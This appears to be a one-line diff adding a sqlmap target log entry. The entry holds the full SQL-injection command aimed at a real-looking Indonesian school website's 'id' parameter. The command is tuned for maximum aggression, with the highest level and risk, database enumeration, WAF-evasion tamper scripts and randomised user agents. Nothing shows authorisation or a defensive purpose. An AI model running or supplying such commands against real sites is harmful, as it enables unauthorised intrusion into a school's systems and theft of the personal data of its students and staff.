@@ -1,0 +1,1 @@
+https://smk.bhinakaryakaranganyar.sch.id/index.php?id=1 (GET)  # /data/data/com.termux/files/usr/bin/sqlmap -u https://smk.bhinakaryakaranganyar.sch.id/index.php?id=1 --batch --dbs --level=5 --risk=3 --threads=10 --random-agent --force-ssl --ignore-redirects --tamper=between,randomcase,space2comment --technique=BEUSTQ --batch --timeout=30
